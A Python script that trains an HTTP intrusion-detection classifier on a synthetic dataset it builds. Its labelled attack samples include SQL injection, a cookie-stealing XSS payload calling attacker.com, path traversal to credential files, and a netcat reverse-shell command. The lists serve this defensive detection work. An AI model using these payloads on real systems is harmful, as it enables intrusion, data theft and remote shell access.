"""
Machine Learning Training and Rigorous Academic Evaluation Pipeline.
Trains Random Forest (Multi-Class) and Isolation Forest (Zero-Day Anomaly Detection).
Evaluates strictly on held-out test data and saves actual metrics, confusion matrix,
and latency benchmarks to reports/.
"""
import time
import json
import random
import numpy as np
import pandas as pd
import matplotlib
matplotlib.use("Agg")  # Headless backend for server/CLI
import matplotlib.pyplot as plt
import joblib
from pathlib import Path

from sklearn.model_selection import train_test_split
from sklearn.ensemble import RandomForestClassifier, IsolationForest
from sklearn.metrics import (
    classification_report,
    confusion_matrix,
    accuracy_score,
    precision_recall_fscore_support,
)
from sklearn.preprocessing import StandardScaler

from features import extract_features, features_to_vector, FEATURE_NAMES
from config import MODELS_DIR, REPORTS_DIR, DATA_DIR

CLASS_NAMES = [
    "Benign",
    "SQL_Injection",
    "XSS",
    "Path_Traversal",
    "Command_Injection",
    "Brute_Force",
]


def generate_synthetic_dataset() -> pd.DataFrame:
    """
    Generates a realistic, diverse dataset of HTTP requests:
    - Benign API requests (product searches, user pagination, updates, sorting)
    - SQL Injection (error-based, union-based, time-based, boolean-based, obfuscated)
    - XSS (reflected, stored, DOM, encoded tags, SVG handlers, javascript pseudo-protocols)
    - Path Traversal (relative dots, double encoded dots, sensitive system files)
    - Command Injection (chained commands, pipes, backticks, subshells)
    - Brute Force / Auth Abuse (rapid login attempts, credential cycling)
    """
    print("[*] Generating comprehensive HTTP security dataset...")
    records = []

    # 1. Benign Requests (~1500 samples)
    benign_paths = [
        "/demo/api/users", "/demo/api/products", "/demo/api/search",
        "/demo/api/system/status", "/demo/api/files/download", "/demo/api/orders",
        "/demo/api/cart", "/demo/api/profile", "/demo/api/settings",
    ]
    search_terms = [
        "laptop", "phone", "wireless mouse", "usb cable", "mechanical keyboard",
        "monitor 4k", "noise cancelling headphones", "tablet", "desk chair",
        "john.doe", "alice", "bob_ops", "admin_root", "finance", "q3_report",
    ]

    for _ in range(1500):
        path = random.choice(benign_paths)
        method = random.choice(["GET", "GET", "GET", "POST", "PUT"])
        query = ""
        body = ""
        if method == "GET":
            if "search" in path:
                query = f"q={urllib_quote(random.choice(search_terms))}&page={random.randint(1, 10)}"
            elif "products" in path:
                query = f"category={random.choice(['Hardware', 'Software', 'Service'])}&sort=price_asc"
            elif "users" in path:
                query = f"search={urllib_quote(random.choice(search_terms[:5]))}&limit={random.choice([10, 25, 50])}"
            elif "download" in path:
                query = f"file={random.choice(['report_2026.pdf', 'architecture_spec.md', 'dataset_meta.json'])}"
        else:
            body = json.dumps({
                "name": random.choice(search_terms),
                "timestamp": int(time.time()),
                "status": "active",
                "count": random.randint(1, 20),
            })

        client_stats = {
            "request_frequency": random.uniform(1.0, 8.0),
            "unique_endpoint_count": random.uniform(1.0, 5.0),
            "recent_suspicious_count": 0.0,
            "behavioral_deviation_score": random.uniform(0.0, 0.4),
        }
        records.append((method, path, query, body, client_stats, 0))

    # 2. SQL Injection Attacks (~600 samples)
    sqli_payloads = [
        "' OR '1'='1",
        "admin' --",
        "admin' OR '1'='1' UNION SELECT username, password FROM users--",
        "' UNION SELECT username, password FROM users --",
        "' UNION SELECT 1, null, version(), database() #",
        "1; DROP TABLE users; --",
        "' OR 1=1; WAITFOR DELAY '0:0:5'--",
        "1 AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT DATABASE()), FLOOR(RAND(0)*2)) x FROM INFORMATION_SCHEMA.TABLES GROUP BY x) a)",
        "id=1' AND SLEEP(5)--",
        "' OR 'a'='a",
        "\" OR \"1\"=\"1",
        "1' OR 1=1#",
        "' UNION ALL SELECT NULL, NULL, NULL--",
        # Obfuscated variants
        "SEL/**/ECT 1,2 FROM users",
        "UN/**/ION/**/SEL/**/ECT username, password FROM users",
        "%27%20OR%201%3D1--",
        "admin%27%20UNION%20SELECT%20*%20FROM%20users--",
        "%2527%2520OR%2520%25271%2527%253D%25271",
        "1' OR 'x'='x' /*!50000SELECT*/ 1",
    ]
    for _ in range(600):
        payload = random.choice(sqli_payloads)
        path = random.choice(["/demo/api/users", "/demo/api/search", "/demo/api/products"])
        method = random.choice(["GET", "POST"])
        query = f"search={payload}" if method == "GET" else ""
        body = json.dumps({"query": payload, "filter": "raw"}) if method == "POST" else ""
        client_stats = {
            "request_frequency": random.uniform(1.0, 8.0),
            "unique_endpoint_count": random.uniform(1.0, 4.0),
            "recent_suspicious_count": random.choice([0.0, 0.0, 1.0]),
            "behavioral_deviation_score": random.uniform(0.0, 0.5),
        }
        records.append((method, path, query, body, client_stats, 1))

    # 3. Cross-Site Scripting (XSS) (~600 samples)
    xss_payloads = [
        "<script>alert('xss')</script>",
        "<script>alert(1)</script>",
        "<script>document.location='http://attacker.com/steal?c='+document.cookie</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(document.domain)>",
        "<iframe src=\"javascript:alert('xss')\"></iframe>",
        "<body onload=alert('XSS')>",
        "<a href=\"javascript:eval('alert(1)')\">Click</a>",
        "javascript:alert(1)",
        # Obfuscated variants
        "%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
        "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
        "<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>",
        "&lt;script&gt;alert(document.cookie)&lt;/script&gt;",
        "%253Cscript%253Ealert(1)%253C/script%253E",
    ]
    for _ in range(600):
        payload = random.choice(xss_payloads)
        path = random.choice(["/demo/api/search", "/demo/api/comments", "/demo/api/feedback"])
        method = random.choice(["GET", "POST"])
        query = f"q={payload}" if method == "GET" else ""
        body = json.dumps({"comment": payload, "user": "guest"}) if method == "POST" else ""
        client_stats = {
            "request_frequency": random.uniform(1.0, 8.0),
            "unique_endpoint_count": random.uniform(1.0, 4.0),
            "recent_suspicious_count": random.choice([0.0, 0.0, 1.0]),
            "behavioral_deviation_score": random.uniform(0.0, 0.5),
        }
        records.append((method, path, query, body, client_stats, 2))

    # 4. Path Traversal (~550 samples)
    traversal_payloads = [
        "../../../../etc/passwd",
        "../../../../windows/win.ini",
        "../../../../etc/shadow",
        "../../../../boot.ini",
        "..\\..\\..\\..\\windows\\system32\\config\\sam",
        "../../../etc/passwd",
        "../../etc/passwd",
        # Obfuscated variants
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "%252e%252e%252f%252e%252e%252fetc/passwd",
        "..%2f..%2f..%2fetc/passwd%00.pdf",
        "....//....//....//etc/passwd",
        "/demo/api/files/download?file=..%252f..%252fetc%252fpasswd",
    ]
    for _ in range(550):
        payload = random.choice(traversal_payloads)
        path = "/demo/api/files/download"
        method = "GET"
        query = f"file={payload}"
        body = ""
        client_stats = {
            "request_frequency": random.uniform(1.0, 8.0),
            "unique_endpoint_count": random.uniform(1.0, 4.0),
            "recent_suspicious_count": random.choice([0.0, 0.0, 1.0]),
            "behavioral_deviation_score": random.uniform(0.0, 0.5),
        }
        records.append((method, path, query, body, client_stats, 3))

    # 5. Command Injection (~550 samples)
    cmd_payloads = [
        "; cat /etc/passwd | whoami",
        "; cat /etc/passwd",
        "| whoami",
        "& ping -c 4 127.0.0.1 &",
        "`id`",
        "$(whoami)",
        "; ls -la /",
        "| netcat -e /bin/sh 10.0.0.1 4444",
        "&& uname -a",
        # Obfuscated
        "%3B%20cat%20%2Fetc%2Fpasswd",
        ";%20cat$IFS/etc/passwd",
        "|%20whoami",
    ]
    for _ in range(550):
        payload = random.choice(cmd_payloads)
        path = random.choice(["/demo/api/ping", "/demo/api/diagnostic", "/demo/api/system"])
        method = random.choice(["GET", "POST"])
        query = f"host=127.0.0.1{payload}" if method == "GET" else ""
        body = json.dumps({"target": f"localhost{payload}"}) if method == "POST" else ""
        client_stats = {
            "request_frequency": random.uniform(1.0, 8.0),
            "unique_endpoint_count": random.uniform(1.0, 4.0),
            "recent_suspicious_count": random.choice([0.0, 0.0, 1.0]),
            "behavioral_deviation_score": random.uniform(0.0, 0.5),
        }
        records.append((method, path, query, body, client_stats, 4))

    # 6. Brute Force / Auth Abuse (~500 samples)
    for _ in range(500):
        path = "/demo/api/login"
        method = "POST"
        query = ""
        body = json.dumps({
            "username": random.choice(["admin", "root", "user1", "test", "sales", "operator"]),
            "password": f"pass{random.randint(100, 9999)}!",
        })
        client_stats = {
            "request_frequency": random.uniform(25.0, 80.0),  # High frequency burst
            "unique_endpoint_count": 1.0,                     # Hammering single login endpoint
            "recent_suspicious_count": random.uniform(2.0, 6.0),
            "behavioral_deviation_score": random.uniform(1.5, 3.8), # Strong behavioral deviation
        }
        records.append((method, path, query, body, client_stats, 5))

    # Extract 23 features using features.py
    data_rows = []
    labels = []
    print(f"[*] Extracting 23 features across {len(records)} generated requests...")

    for method, path, query, body, client_stats, label in records:
        feats, _, _, _ = extract_features(
            method=method,
            path=path,
            query_string=query,
            body=body,
            headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"},
            client_stats=client_stats,
        )
        vec = features_to_vector(feats)
        data_rows.append(vec)
        labels.append(label)

    df = pd.DataFrame(data_rows, columns=FEATURE_NAMES)
    df["label"] = labels

    # Save generated raw training dataset for audit
    csv_path = DATA_DIR / "training_data.csv"
    df.to_csv(csv_path, index=False)
    print(f"[OK] Saved dataset to {csv_path} ({len(df)} rows)")
    return df


def urllib_quote(s: str) -> str:
    import urllib.parse
    return urllib.parse.quote(s)


def train_and_evaluate():
    """Trains Random Forest + Isolation Forest and computes real evaluation metrics."""
    df = generate_synthetic_dataset()

    X = df[FEATURE_NAMES].values
    y = df["label"].values

    # Stratified Train/Test Split (80% train, 20% test)
    X_train, X_test, y_train, y_test = train_test_split(
        X, y, test_size=0.20, random_state=42, stratify=y
    )
    print(f"[*] Training samples: {len(X_train)} | Test evaluation samples: {len(X_test)}")

    # 1. Supervised Random Forest Classifier
    print("[*] Training RandomForestClassifier (100 estimators, max_depth=12)...")
    rf_clf = RandomForestClassifier(
        n_estimators=100,
        max_depth=12,
        random_state=42,
        class_weight="balanced",
        n_jobs=-1,
    )
    rf_clf.fit(X_train, y_train)

    # 2. Unsupervised Isolation Forest (Trained strictly on benign traffic)
    print("[*] Training IsolationForest on benign baseline for zero-day anomaly detection...")
    X_benign_train = X_train[y_train == 0]
    iso_forest = IsolationForest(
        n_estimators=100,
        contamination=0.08,
        random_state=42,
        n_jobs=-1,
    )
    iso_forest.fit(X_benign_train)

    # Measure Real Latency Benchmark on Test Set
    print("[*] Running inference latency benchmark over test set...")
    latencies = []
    for i in range(len(X_test)):
        sample = X_test[i : i + 1]
        t0 = time.perf_counter()
        _ = rf_clf.predict_proba(sample)
        _ = iso_forest.score_samples(sample)
        t1 = time.perf_counter()
        latencies.append((t1 - t0) * 1000.0)  # milliseconds

    p50_latency = float(np.percentile(latencies, 50))
    p95_latency = float(np.percentile(latencies, 95))
    p99_latency = float(np.percentile(latencies, 99))
    avg_latency = float(np.mean(latencies))

    # Evaluate on Held-Out Test Set
    y_pred = rf_clf.predict(X_test)
    acc = float(accuracy_score(y_test, y_pred))
    prec_macro, rec_macro, f1_macro, _ = precision_recall_fscore_support(
        y_test, y_pred, average="macro"
    )
    prec_weighted, rec_weighted, f1_weighted, _ = precision_recall_fscore_support(
        y_test, y_pred, average="weighted"
    )

    # Per-class classification report
    clf_report_dict = classification_report(
        y_test, y_pred, target_names=CLASS_NAMES, output_dict=True
    )

    # Confusion Matrix
    cm = confusion_matrix(y_test, y_pred)

    # Calculate False Positive Rate (Benign misclassified as any attack)
    benign_total = np.sum(cm[0])
    benign_false_positives = benign_total - cm[0][0]
    fpr = float(benign_false_positives / benign_total) if benign_total > 0 else 0.0

    print("\n" + "=" * 60)
    print("REAL EVALUATION METRICS (Held-Out Test Set):")
    print(f"Accuracy:          {acc * 100:.2f}%")
    print(f"Macro Precision:   {prec_macro * 100:.2f}%")
    print(f"Macro Recall:      {rec_macro * 100:.2f}%")
    print(f"Macro F1-Score:    {f1_macro * 100:.2f}%")
    print(f"False Positive Rate: {fpr * 100:.2f}%")
    print(f"Average Latency:   {avg_latency:.3f} ms (P50: {p50_latency:.3f}ms, P95: {p95_latency:.3f}ms)")
    print("=" * 60)

    # Save Models
    rf_model_path = MODELS_DIR / "model.pkl"
    iso_model_path = MODELS_DIR / "iso_model.pkl"
    joblib.dump(rf_clf, rf_model_path)
    joblib.dump(iso_forest, iso_model_path)
    print(f"[OK] Saved Random Forest model to {rf_model_path}")
    print(f"[OK] Saved Isolation Forest model to {iso_model_path}")

    # Plot & Save Confusion Matrix
    fig, ax = plt.subplots(figsize=(8, 6))
    im = ax.imshow(cm, interpolation="nearest", cmap=plt.cm.Blues)
    ax.figure.colorbar(im, ax=ax)
    ax.set(
        xticks=np.arange(cm.shape[1]),
        yticks=np.arange(cm.shape[0]),
        xticklabels=CLASS_NAMES,
        yticklabels=CLASS_NAMES,
        title="AI Gateway IDS - Confusion Matrix (Test Set)",
        ylabel="True Label",
        xlabel="Predicted Label",
    )
    plt.setp(ax.get_xticklabels(), rotation=45, ha="right", rotation_mode="anchor")

    # Annotate values inside cells
    thresh = cm.max() / 2.0
    for i in range(cm.shape[0]):
        for j in range(cm.shape[1]):
            ax.text(
                j, i, format(cm[i, j], "d"),
                ha="center", va="center",
                color="white" if cm[i, j] > thresh else "black",
            )
    fig.tight_layout()
    cm_path = REPORTS_DIR / "confusion_matrix.png"
    plt.savefig(cm_path, dpi=200)
    plt.close()
    print(f"[OK] Saved confusion matrix chart to {cm_path}")

    # Feature Importance Plot
    importances = rf_clf.feature_importances_
    indices = np.argsort(importances)[::-1]
    top_10_indices = indices[:10]

    fig, ax = plt.subplots(figsize=(10, 5))
    ax.barh(range(10), importances[top_10_indices][::-1], color="#4f46e5", align="center")
    ax.set_yticks(range(10))
    ax.set_yticklabels([FEATURE_NAMES[i] for i in top_10_indices][::-1])
    ax.set_xlabel("Gini Feature Importance")
    ax.set_title("Top 10 Most Influential Security Features (Random Forest)")
    fig.tight_layout()
    fi_path = REPORTS_DIR / "feature_importance.png"
    plt.savefig(fi_path, dpi=200)
    plt.close()
    print(f"[OK] Saved feature importance chart to {fi_path}")

    # Save Metrics JSON
    metrics_data = {
        "timestamp": time.time(),
        "model_version": "v1.0",
        "test_samples_count": len(y_test),
        "accuracy": round(acc, 4),
        "macro_precision": round(prec_macro, 4),
        "macro_recall": round(rec_macro, 4),
        "macro_f1": round(f1_macro, 4),
        "weighted_f1": round(f1_weighted, 4),
        "false_positive_rate": round(fpr, 4),
        "latency_benchmark_ms": {
            "avg": round(avg_latency, 3),
            "p50": round(p50_latency, 3),
            "p95": round(p95_latency, 3),
            "p99": round(p99_latency, 3),
        },
        "per_class_metrics": clf_report_dict,
        "confusion_matrix": cm.tolist(),
        "feature_importances": {
            FEATURE_NAMES[i]: round(float(importances[i]), 4) for i in top_10_indices
        },
    }

    metrics_path = REPORTS_DIR / "metrics.json"
    with open(metrics_path, "w", encoding="utf-8") as f:
        json.dump(metrics_data, f, indent=2)
    print(f"[OK] Saved evaluation metrics JSON to {metrics_path}")

    return metrics_data


if __name__ == "__main__":
    train_and_evaluate()
